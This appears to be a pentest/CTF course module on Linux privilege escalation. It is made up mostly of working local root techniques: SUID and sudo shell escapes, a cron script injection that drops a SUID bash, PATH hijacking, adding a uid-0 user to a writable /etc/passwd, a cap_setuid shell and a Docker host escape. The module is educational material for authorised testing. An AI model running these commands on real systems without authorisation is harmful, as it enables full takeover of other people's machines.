# 04 — Privilege Escalation: Core Concepts & Attacker Thinking

> You have a shell. You're a low-privilege user. Now what? This section is about going from user to root.

> 📋 **What You Will Do In This Section**
> - [ ] Understand the 8 major Linux privilege escalation vectors
> - [ ] Find and exploit SUID binaries using GTFOBins
> - [ ] Check sudo permissions and exploit misconfigurations
> - [ ] Discover and hijack writable cron jobs
> - [ ] Perform PATH hijacking against scripts using relative paths
> - [ ] Identify writable critical files (/etc/passwd, /etc/shadow)
> - [ ] Check for capabilities and Docker breakout opportunities
> - [ ] Run a full enumeration checklist in under 5 minutes

---

## 🔴 The Privilege Escalation Mindset

> 💡 **Why This Matters**
> Getting a low-privilege shell is just the beginning. Without root, you can't access `/etc/shadow`, install persistence, read other users' data, or prove full compromise in your report. PrivEsc turns a medium finding into a critical one — and it's tested on every pentest, every CTF, and every OSCP exam.

```
Initial Shell (www-data, user)
  │
  ├─→ Who am I? What can I access?
  ├─→ What's running? What's listening?
  ├─→ What can I write? What can I execute?
  ├─→ What's misconfigured?
  └─→ Root
```

---

## 🔴 Linux Privilege Escalation Vectors

### 1. SUID/SGID Binaries

> 💡 **Why This Matters**
> SUID binaries run as the file owner (usually root), regardless of who executes them. If `find` has SUID set, running `find . -exec /bin/sh -p \;` gives you a root shell instantly. This is the #2 most common privesc vector after sudo.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
```

**Commonly exploitable SUID binaries:**

| Binary | Exploit |
|--------|---------|
| `find` | `find . -exec /bin/sh -p \;` |
| `vim` | `vim -c ':!sh'` |
| `nmap` (old) | `nmap --interactive` then `!sh` |
| `bash` | `bash -p` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `less` | `less /etc/passwd` then `!sh` |
| `env` | `env /bin/sh -p` |
| `cp` | Copy /etc/passwd, add root user, copy back |
| `wget` | Download modified /etc/passwd, overwrite |

**Check GTFOBins**: https://gtfobins.github.io/ — the ultimate reference for SUID/sudo escalation.

#### 🧪 Try It Now — SUID Exploitation (Local Practice)

```bash
# Create a practice SUID binary (requires sudo)
sudo cp /usr/bin/find /tmp/find-suid
sudo chmod u+s /tmp/find-suid

# Verify it has SUID
ls -la /tmp/find-suid
# Expected: -rwsr-xr-x (note the 's')

# Find it like you would on a real target
find /tmp -perm -4000 -type f 2>/dev/null

# Exploit it
/tmp/find-suid . -exec /bin/sh -p \; -quit
whoami
```

> ✅ **Expected Output**
> ```
> -rwsr-xr-x 1 root root 233888 ... /tmp/find-suid
> /tmp/find-suid
> # whoami
> root
> ```
> You went from your normal user to root by exploiting the SUID binary!

> 🔧 **If Stuck**
> - Shell doesn't change to root → Make sure you used `-p` flag (preserves privileges). Without `-p`, bash drops SUID privileges.
> - `find` not exploitable → Check GTFOBins for the specific binary you found.
> - Clean up when done: `sudo rm /tmp/find-suid`

### 2. Sudo Misconfigurations

> 💡 **Why This Matters**
> `sudo -l` is the single fastest path to root. It takes 5 seconds to run, and if the output shows `NOPASSWD` for ANY binary, you can almost certainly get root. Always check this FIRST.

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim    → sudo vim -c ':!sh'
# (ALL) NOPASSWD: /usr/bin/find   → sudo find / -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/env    → sudo env /bin/sh
# (ALL) NOPASSWD: /usr/bin/awk    → sudo awk 'BEGIN {system("/bin/sh")}'
# (ALL) NOPASSWD: /usr/bin/python → sudo python -c 'import os;os.system("/bin/sh")'
# (ALL) NOPASSWD: /usr/bin/less   → sudo less /etc/shadow → !sh
# (ALL) NOPASSWD: /usr/bin/man    → sudo man man → !sh

# Sudo version exploit (CVE-2021-3156 — Baron Samedit)
sudo --version  # If < 1.9.5p2, may be vulnerable
```

#### 🧪 Try It Now — Check Your Sudo Permissions

```bash
sudo -l 2>/dev/null
```

> ✅ **Expected Output**
> ```
> Matching Defaults entries for user:
>     ...
> User user may run the following commands:
>     (ALL : ALL) ALL
> ```
> Or: `(ALL) NOPASSWD: /usr/bin/somebinary` — if you see NOPASSWD for ANY binary, look it up on GTFOBins immediately!

### 3. Cron Jobs

> 💡 **Why This Matters**
> Cron jobs run on a schedule — and if a job runs as root but the script it executes is writable by your user, you can inject commands that will be executed as root on the next schedule tick.

```bash
# Check system cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Look for writable scripts executed by cron
cat /etc/crontab | grep -v "^#" | awk '{print $7}' | while read script; do
  if [ -w "$script" ] 2>/dev/null; then
    echo "[!] WRITABLE CRON SCRIPT: $script"
  fi
done

# Watch for new processes (hidden cron jobs)
# Download pspy from: https://github.com/DominicBreuker/pspy
./pspy64

# Exploit: inject into writable cron script
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
# Wait for cron to execute, then:
/tmp/rootbash -p
```

### 4. PATH Hijacking

> 💡 **Why This Matters**
> If a script run by root calls a command without its full path (e.g., `tar` instead of `/usr/bin/tar`), you can create a malicious version earlier in the PATH. When root's script runs, it executes YOUR version instead.

```bash
# Example: A cron job runs /opt/scripts/backup.sh containing:
# #!/bin/bash
# tar czf /tmp/backup.tar.gz /home/user/

# Create malicious "tar"
echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH

# Now when backup.sh runs, it executes YOUR "tar" → root shell
```

### 5. Writable Files & Directories

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Critical writable files:
# /etc/passwd → Add a root user
# /etc/shadow → Replace root password hash
# /etc/sudoers → Add sudo privileges
# /etc/crontab → Add a cron job

# Adding a root user via writable /etc/passwd
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$...
echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: password123 → root!
```

#### 🧪 Try It Now — Writable File Check

```bash
echo "=== Critical File Permissions ==="
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab; do
  PERMS=$(ls -la $f 2>/dev/null | awk '{print $1}')
  WRITABLE=$([ -w "$f" ] && echo "⚠️  WRITABLE" || echo "✅ Protected")
  echo "  $f → $PERMS → $WRITABLE"
done
```

> ✅ **Expected Output**
> ```
>   /etc/passwd → -rw-r--r-- → ✅ Protected
>   /etc/shadow → -rw-r----- → ✅ Protected
>   /etc/sudoers → -r--r----- → ✅ Protected
>   /etc/crontab → -rw-r--r-- → ✅ Protected
> ```
> On a well-configured system, these are all protected. On a vulnerable system, finding `/etc/passwd` writable = instant root.

### 6. Kernel Exploits

```bash
# Check kernel version
uname -a
cat /proc/version

# Famous kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8+
# DirtyCow (CVE-2016-5195) — Linux 2.6.22 - 4.8.3
# PwnKit (CVE-2021-4034) — Polkit (almost all Linux distros)
# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
```

#### 🧪 Try It Now — Kernel Exploit Check

```bash
echo "=== Kernel Version ==="
uname -r

echo ""
echo "=== Sudo Version ==="
sudo --version 2>/dev/null | head -1

echo ""
echo "=== Polkit Version (PwnKit check) ==="
pkexec --version 2>/dev/null || echo "pkexec not found"
```

> ✅ **Expected Output**
> ```
> === Kernel Version ===
> 5.15.0-generic (or similar)
>
> === Sudo Version ===
> Sudo version 1.9.5p2 (patched against Baron Samedit)
>
> === Polkit Version ===
> pkexec version 0.105 (check if vulnerable to PwnKit)
> ```

### 7. Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_net_raw → Can sniff network traffic
# cap_dac_read_search → Can read any file
```

### 8. Docker Breakout

```bash
# Are we in a Docker container?
ls /.dockerenv 2>/dev/null && echo "IN DOCKER" || echo "NOT IN DOCKER"

# Docker group membership → Same as root
id | grep docker
# If in docker group:
docker run -v /:/host -it ubuntu chroot /host /bin/bash

# Docker socket exposed
ls -la /var/run/docker.sock
```

---

## 🔴 Enumeration Checklist (Run This First)

#### 🧪 Try It Now — Quick Enumeration Script

```bash
echo "=========================================="
echo "  PRIVILEGE ESCALATION QUICK CHECK"
echo "=========================================="
echo ""
echo "=== Identity ==="
whoami && id
echo ""
echo "=== System ==="
hostname && uname -r && cat /etc/os-release 2>/dev/null | grep PRETTY
echo ""
echo "=== Sudo ==="
sudo -l 2>/dev/null | tail -5 || echo "Cannot run sudo -l"
echo ""
echo "=== SUID Binaries (non-standard) ==="
find / -perm -4000 -type f 2>/dev/null | grep -v -E "snap|lib|bin/(su|passwd|mount|umount|chsh|chfn|newgrp|gpasswd|ping)" | head -10
echo ""
echo "=== Writable /etc/passwd? ==="
[ -w /etc/passwd ] && echo "⚠️  YES - GAME OVER" || echo "✅ No"
echo ""
echo "=== Docker? ==="
id | grep -q docker && echo "⚠️  In docker group" || echo "✅ Not in docker group"
ls /.dockerenv 2>/dev/null && echo "⚠️  Inside container" || echo "✅ Not in container"
echo ""
echo "=== Interesting Cron ==="
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | tail -5
echo ""
echo "=== Capabilities ==="
getcap -r / 2>/dev/null | grep -v "snap" | head -5
echo "=========================================="
```

> ✅ **Expected Output**
> A summary of your current system's privesc surface. On a CTF/HTB box, you'd see highlighted misconfigurations. On your own system, most things should be "Protected."

---

## 🔴 Common Mistakes

1. **Running kernel exploits first**: Always check low-hanging fruit (SUID, sudo, cron) before risking system stability
2. **Not checking sudo -l**: This is the #1 quickest path to root
3. **Ignoring internal services**: MySQL running as root with default creds = root
4. **Not looking at running processes**: A root process might load a writable config file
5. **Missing writable scripts**: If root's cron runs `/opt/script.sh` and you can write to it, game over
6. **Forgetting /etc/passwd**: If writable, you add a root user in 10 seconds

---

## 🧠 If You're Stuck

1. Run LinPEAS and read EVERY red/yellow line of output
2. Check `sudo -l` again — did you miss something?
3. Monitor processes with `pspy` — cron jobs might not be in crontab
4. Look at internal services: `ss -tulpn` — what's listening on localhost only?
5. Check for Docker: `id | grep docker` or `ls /.dockerenv`
6. Search for passwords: `grep -rn "password\|pass\|pwd" /var/www/ /opt/ /home/ 2>/dev/null`
7. Check kernel version against known exploits as a last resort

---

## 🧠 Section 04 Complete — Self-Check

Before moving to `05-post-exploitation/`, verify you can:

- [ ] Run `sudo -l` and recognize exploitable entries
- [ ] Find SUID binaries and look them up on GTFOBins
- [ ] Identify writable cron job scripts
- [ ] Explain PATH hijacking and execute it
- [ ] Check if `/etc/passwd` is writable and add a root user
- [ ] Detect Docker group membership and escape
- [ ] Run a quick enumeration in under 2 minutes
